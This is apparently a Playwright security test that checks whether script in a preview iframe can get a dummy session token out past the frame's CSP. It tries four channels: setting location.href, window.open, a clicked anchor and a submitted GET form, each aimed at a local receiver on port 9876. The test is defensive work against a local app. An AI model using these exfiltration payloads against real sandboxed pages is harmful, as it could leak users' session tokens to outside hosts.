// P0-2 followup: does top-level navigation (location / window.open / <a target>) escape the
// frame CSP as a one-way exfiltration channel? CSP has no navigate-to and the frame is not
// sandboxed. Local receiver on :9876 detects any navigation that reaches an external URL.
import { createRequire } from 'node:module';
import { createServer } from 'node:http';
import { writeFileSync } from 'node:fs';
const require = createRequire('/Users/psw/Projects/toss-toi-test/e2e/package.json');
const { chromium } = require('@playwright/test');
const out=[]; const log=s=>{out.push(s);console.log(s);};
const STUDIO='http://localhost:5173'; const pid='aaaaaaaa-0000-4000-8000-000000000001';
const hits=[];
const receiver=createServer((req,res)=>{hits.push(req.method+' '+req.url);res.writeHead(200).end('ok');});
await new Promise(r=>receiver.listen(9876,'127.0.0.1',r));

// Each variant tested in its own frame load (navigation destroys the frame).
async function variant(channel){
  const attack = `
  const secret='SESSION.CAP.TOKENS';
  try{
    if(${JSON.stringify(channel)}==='location'){ location.href='http://127.0.0.1:9876/exfil-location?d='+secret; }
    if(${JSON.stringify(channel)}==='windowopen'){ window.open('http://127.0.0.1:9876/exfil-open?d='+secret,'_blank'); }
    if(${JSON.stringify(channel)}==='anchor'){ const a=document.createElement('a'); a.href='http://127.0.0.1:9876/exfil-anchor?d='+secret; a.target='_blank'; document.body.appendChild(a); a.click(); }
    if(${JSON.stringify(channel)}==='formget'){ const f=document.createElement('form'); f.action='http://127.0.0.1:9876/exfil-form'; f.method='GET'; const i=document.createElement('input'); i.name='d'; i.value=secret; f.appendChild(i); document.body.appendChild(f); f.submit(); }
  }catch(e){ console.log('R3NAV threw '+e.message); }
  export default null;`;
  const parentHtml=`<!doctype html><html><body><script>
  const f=document.createElement('iframe'); f.setAttribute('sandbox','allow-scripts allow-same-origin');
  f.src='http://p-${pid}.preview.localhost:5174/frame.html?parentOrigin='+encodeURIComponent(location.origin);
  addEventListener('message',ev=>{if(ev.data&&ev.data.kind==='frame_ready')ev.source.postMessage({kind:'load',token:{projectId:'${pid}',revision:1,attemptId:'a',sourceDigest:'d',manifestDigest:'m'},importMap:{imports:{}},code:window.__attack,mountId:'root'},'*');});
  document.body.appendChild(f);
  </script></body></html>`;
  const ctx=await browser.newContext(); const page=await ctx.newPage();
  await ctx.route(STUDIO+'/r3-parent',rt=>rt.fulfill({status:200,contentType:'text/html',body:parentHtml}));
  await page.addInitScript(c=>{window.__attack=c;},attack);
  await page.goto(STUDIO+'/r3-parent');
  await page.waitForTimeout(1500);
  await ctx.close();
}
const browser=await chromium.launch({args:['--disable-features=LocalNetworkAccessChecks,PrivateNetworkAccessChecks,BlockInsecurePrivateNetworkRequests','--disable-popup-blocking']});
for(const c of ['location','windowopen','anchor','formget']){ hits.length; await variant(c); }
await browser.close(); receiver.close();
log('# Navigation egress receiver hits (any entry = CSP-bypassing exfiltration channel):');
for(const h of hits) log('  RECEIVED: '+h);
if(!hits.length) log('  (none — navigation channels also contained)');
writeFileSync(new URL('./p02-nav-egress.out',import.meta.url),out.join('\n')+'\n');
